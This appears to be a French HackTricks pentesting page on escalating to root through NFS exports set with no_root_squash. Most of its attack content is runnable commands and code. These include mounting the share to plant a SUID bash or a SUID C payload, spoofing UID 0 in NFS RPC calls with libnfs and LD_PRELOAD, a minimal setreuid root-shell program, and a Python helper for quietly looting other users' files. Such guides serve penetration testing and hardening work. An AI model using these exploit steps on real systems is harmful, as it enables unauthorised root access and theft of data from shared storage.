<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


Lisez le fichier _ **/etc/exports** _, si vous trouvez un répertoire configuré comme **no\_root\_squash**, alors vous pouvez **y accéder** depuis **un client** et **écrire à l'intérieur** de ce répertoire **comme** si vous étiez le **root** local de la machine.

**no\_root\_squash**: Cette option donne essentiellement l'autorité à l'utilisateur root sur le client pour accéder aux fichiers sur le serveur NFS en tant que root. Et cela peut entraîner de graves implications en matière de sécurité.

**no\_all\_squash:** C'est similaire à l'option **no\_root\_squash** mais s'applique aux **utilisateurs non root**. Imaginez, vous avez un shell en tant qu'utilisateur nobody ; vérifiez le fichier /etc/exports ; l'option no\_all\_squash est présente ; vérifiez le fichier /etc/passwd ; émulez un utilisateur non root ; créez un fichier suid en tant que cet utilisateur (en montant en utilisant nfs). Exécutez le suid en tant qu'utilisateur nobody et devenez un utilisateur différent.

# Élévation de privilèges

## Exploitation à distance

Si vous avez trouvé cette vulnérabilité, vous pouvez l'exploiter :

* **Monter ce répertoire** sur une machine cliente, et **copier en tant que root** à l'intérieur du dossier monté le binaire **/bin/bash** et lui donner des droits **SUID**, et **exécuter depuis la machine victime** ce binaire bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Monter ce répertoire** sur une machine cliente, et **en tant que root copier** à l'intérieur du dossier monté notre charge utile compilée qui exploitera la permission SUID, lui donnera des droits SUID, et **exécutera depuis la machine victime** ce binaire (vous pouvez trouver ici quelques [charges utiles C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Exploitation locale

{% hint style="info" %}
Notez que si vous pouvez créer un **tunnel de votre machine à la machine victime, vous pouvez toujours utiliser la version à distance pour exploiter cette élévation de privilèges en tunnelisant les ports requis**.\
Le tour suivant est dans le cas où le fichier `/etc/exports` **indique une adresse IP**. Dans ce cas, vous ne pourrez **en aucun cas utiliser l'exploit à distance** et vous devrez **abuser de cette astuce**.\
Une autre exigence requise pour que l'exploit fonctionne est que **l'exportation à l'intérieur de `/etc/export` doit utiliser le drapeau `insecure`**.\
\--_Je ne suis pas sûr que si `/etc/export` indique une adresse IP, cette astuce fonctionnera_--
{% endhint %}

**Astuce copiée de** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html)

Maintenant, supposons que le serveur de partage exécute toujours `no_root_squash`, mais qu'il y a quelque chose qui nous empêche de monter la partage sur notre machine de test de pénétration. Cela se produirait si le fichier `/etc/exports` a une liste explicite d'adresses IP autorisées à monter la partage.

La liste des partages montre maintenant que seule la machine sur laquelle nous essayons de faire une élévation de privilèges est autorisée à le monter :
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
Cela signifie que nous sommes bloqués pour exploiter la part montée sur la machine localement à partir d'un utilisateur non privilégié. Mais il se trouve qu'il existe une autre faille locale moins connue.

Cette faille repose sur un problème dans la spécification NFSv3 qui stipule que c'est au client d'annoncer son uid/gid lorsqu'il accède à la part. Ainsi, il est possible de falsifier l'uid/gid en forgeant les appels RPC NFS si la part est déjà montée !

Voici une [bibliothèque qui vous permet de le faire](https://github.com/sahlberg/libnfs).

### Compilation de l'exemple <a href="#compiling-the-example" id="compiling-the-example"></a>

En fonction de votre noyau, vous devrez peut-être adapter l'exemple. Dans mon cas, j'ai dû commenter les appels système fallocate.
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Exploitation en utilisant la bibliothèque <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

Utilisons la plus simple des exploitations :
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
Placez notre exploit sur le partage et rendez-le suid root en falsifiant notre uid dans les appels RPC :
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
Tout ce qu'il reste à faire est de le lancer:
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
Nous y sommes, l'élévation de privilèges root locale !

## Bonus NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

Une fois en root local sur la machine, j'ai voulu piller la partage NFS pour trouver des secrets qui me permettraient de pivoter. Mais il y avait de nombreux utilisateurs du partage, chacun avec son propre UID que je ne pouvais pas lire malgré le fait d'être en root en raison de la non-correspondance des UID. Je ne voulais pas laisser de traces évidentes telles qu'un chown -R, alors j'ai écrit un petit extrait de code pour définir mon UID avant d'exécuter la commande shell souhaitée :
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Vous pouvez ensuite exécuter la plupart des commandes comme vous le feriez normalement en les préfixant avec le script :
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
